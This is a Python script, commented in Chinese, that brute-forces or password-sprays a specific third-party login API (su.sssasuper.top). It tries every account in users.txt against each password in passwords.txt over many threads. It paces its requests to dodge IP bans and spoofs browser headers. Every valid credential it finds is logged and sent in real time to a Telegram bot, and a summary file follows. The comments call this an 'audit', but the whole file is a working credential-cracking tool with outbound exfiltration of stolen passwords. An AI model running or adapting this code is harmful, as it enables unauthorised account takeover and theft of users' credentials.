import os
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGIN_URL = "https://su.sssasuper.top/api/v1/passport/auth/login"
USER_FIELD = "email"
PWD_FIELD = "password"
REQUEST_INTERVAL = 0.5    # 多线程下的请求间隔，防止发太快被服务器直接封IP
MAX_WORKERS = 10          # <<< 在这里修改线程数（例如 10 或 20）
RESULT_FILE_PATH = "success_log.txt"
SUMMARY_TXT_PATH = "success_summary.txt"

# ==================== Telegram 配置 ====================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

def send_telegram_file(file_path, caption="📁 *审计运行结果汇总文件*"):
    """直接将生成的 TXT 文件发送到 Telegram 聊天窗口"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[!] 未配置 Telegram 密钥，跳过文件发送")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
            res = requests.post(url, data=data, files=files, timeout=10)
            if res.status_code == 200:
                print("[+] Telegram 文件发送成功")
            else:
                print(f"[!] Telegram 文件发送失败，返回响应: {res.text}")
    except Exception as e:
        print(f"[!] Telegram 文件发送异常: {e}")

def send_telegram_message(message):
    """发送实时文字通知到 Telegram 聊天窗口"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, data=data, timeout=5)
    except Exception:
        pass

def get_accounts():
    """直接读取本地 users.txt 文件"""
    if os.path.exists("users.txt"):
        with open("users.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def get_passwords():
    """直接读取本地 passwords.txt 文件"""
    if os.path.exists("passwords.txt"):
        with open("passwords.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def is_login_success(response):
    """针对当前目标网站的成功判定逻辑"""
    if response.status_code != 200:
        return False
    try:
        data = response.json()
        if isinstance(data, dict):
            if "auth_data" in data or (isinstance(data.get("data"), dict) and "auth_data" in data["data"]):
                return True
            if data.get("status") == "success" or data.get("code") in [200, 0, "200", "success"]:
                return True
    except ValueError:
        pass
    text = response.text.lower()
    if "auth_data" in text or '"status":"success"' in text:
        return True
    return False

def test_credential(username, password, current_time_str):
    """单次请求测试函数（供多线程调用）"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://su.sssasuper.top",
        "Referer": "https://su.sssasuper.top/auth/login"
    }
    try:
        payload = {USER_FIELD: username, PWD_FIELD: password}
        # 每个线程创建独立的 requests.Session 以保证线程安全
        with requests.Session() as session:
            response = session.post(LOGIN_URL, data=payload, headers=headers, timeout=6)
            
            if is_login_success(response):
                return True, username, password
    except requests.exceptions.RequestException:
        pass
    return False, username, password

def main():
    usernames = get_accounts()
    passwords = get_passwords()
    
    if not usernames or not passwords:
        print("[!] 错误：未找到有效的账号字典(users.txt)或密码字典(passwords.txt)！")
        return

    # 运行前清理旧文件
    for path in [RESULT_FILE_PATH, SUMMARY_TXT_PATH]:
        if os.path.exists(path):
            os.remove(path)

    print(f"[*] 全自动多线程审计开始，共 {len(usernames)} 个账号，{len(passwords)} 个密码")
    print(f"[*] 并发线程数: {MAX_WORKERS}")
    print(f"[*] 目标: {LOGIN_URL}\n")

    successful_results = []
    current_time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    success_found = False

    # 密码优先：外层循环密码，内层通过线程池并发测试所有账号
    for password in passwords:
        if success_found: # 如果已经找到正确的了，可以直接提前终止整个遍历（可选）
            break
            
        print(f"\n[*] ==================== 当前测试密码: {password} ====================")
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_user = {}
            for username in usernames:
                # 如果该账号已经成功匹配过，跳过
                if any(res['username'] == username for res in successful_results):
                    continue
                
                # 提交线程任务
                future = executor.submit(test_credential, username, password, current_time_str)
                future_to_user[future] = username

            # 等待当前密码下的所有账号并发请求跑完
            for future in as_completed(future_to_user):
                username = future_to_user[future]
                try:
                    success, uname, pwd = future.result()
                    if success:
                        print(f"\n[+] 【找到正确密码】 {uname} -> {pwd}")
                        success_data = {
                            "username": uname,
                            "password": pwd,
                            "time": current_time_str
                        }
                        successful_results.append(success_data)
                        success_found = True
                        
                        # 1. 实时写入本地日志
                        with open(RESULT_FILE_PATH, "a", encoding="utf-8") as f:
                            f.write(f"[{current_time_str}] 成功: 账号={uname} ---- 密码={pwd}\n")
                        
                        # 2. 实时电报推送
                        realtime_msg = f"🚨 *发现有效凭据实时通知*\n\n账号: `{uname}`\n密码: `{pwd}`\n时间: {current_time_str}"
                        send_telegram_message(realtime_msg)
                    else:
                        print(f"[-] 尝试账号: {uname} : {pwd} (失败)")
                except Exception as e:
                    print(f"[!] 线程异常: {e}")

                time.sleep(REQUEST_INTERVAL)

    # === 全部跑完后，统一生成汇总文件并发送 ===
    summary_content = "=== 审计结果汇总 ===\n\n"
    if successful_results:
        for item in successful_results:
            summary_content += f"账号: {item['username']} | 密码: {item['password']} | 时间: {item['time']}\n"
    else:
        summary_content += f"审计完成时间: {current_time_str}\n状态: 本次未发现有效凭据。\n"
    
    with open(SUMMARY_TXT_PATH, "w", encoding="utf-8") as f:
        f.write(summary_content)
        
    send_telegram_file(SUMMARY_TXT_PATH, caption="📁 *多线程审计任务完成，最终结果汇总文件*")
    print(f"\n[*] 全自动多线程审计结束，共找到 {len(successful_results)} 个有效凭据并已打包发送。")

if __name__ == "__main__":
    main()
